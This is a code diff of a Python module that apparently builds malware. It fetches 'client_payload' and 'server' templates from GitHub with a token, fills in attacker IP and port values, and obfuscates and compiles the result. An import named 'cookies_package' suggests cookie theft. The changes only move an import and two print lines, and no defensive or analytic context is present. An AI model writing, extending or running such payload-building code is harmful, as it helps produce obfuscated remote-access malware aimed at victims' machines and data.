@@ -1,6 +1,6 @@
 import os, shutil
-from cookies_package import *
 from util.plugins.common import clear, cleanup, compile
+from cookies_package import *
 from colorama import Fore
 
 
@@ -15,10 +15,10 @@ def create_client_payload(ip, port):
     filename = "client_payload"
     clear()
     try:
-        print(f"{Fore.GREEN}Creating client payload{Fore.RESET}")
         '''
         Download file from github replace ip and port then obfuscate it and compile it
         '''
+        print(f"{Fore.GREEN}Creating client payload{Fore.RESET}")
         curl_download_github(f"{temp}\\{filename}.py", str(github_Token), str(client_file))
 
         with open(f"{temp}\\{filename}.py", 'r+') as f:
@@ -46,10 +46,10 @@ def create_server_payload(ip, port, host_ip, host_port):
     filename = "server"
     clear()
     try:
-        print(f"{Fore.GREEN}Creating server{Fore.RESET}")
         '''
         Download file from github replace ip and port then obfuscate it and compile it
         '''
+        print(f"{Fore.GREEN}Creating server{Fore.RESET}")
         curl_download_github(f"{temp}\\{filename}.py", str(github_Token), str(server_file))
 
         with open(f"{temp}\\{filename}.py", 'r+') as f: replace_string = f.read().replace("IP_HERE", ip).replace("PORT_HERE", port).replace("HOSTIPHERE", host_ip).replace("HOSTPORTHERE", host_port)
